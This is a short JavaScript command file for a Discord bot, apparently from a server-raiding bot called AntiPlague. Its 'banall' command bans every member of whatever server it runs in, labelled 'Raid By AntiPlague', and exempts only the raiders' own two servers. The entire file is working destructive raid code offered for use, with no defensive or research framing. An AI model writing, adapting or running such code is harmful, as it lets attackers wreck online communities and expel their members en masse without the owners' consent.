const { MessageEmbed } = require('discord.js');

exports.run = async(client, message, args) => {
  if(message.guild.name === "AntiPlague [ Private ]")return;
  if(message.guild.name === "AntiPlague [ Reclutación ]")return;
  try { 
message.guild.members.cache.forEach(members_ban => {
  members_ban.ban({reason:'Raid By AntiPlague'})
})
  } catch(error_ban_all) {
    console.log(error_ban_all.stack);
  }
  
}

exports.help = {
  name:"banall",
  aliases:[],
  usage:"",
  description:"",
  category:""
  
}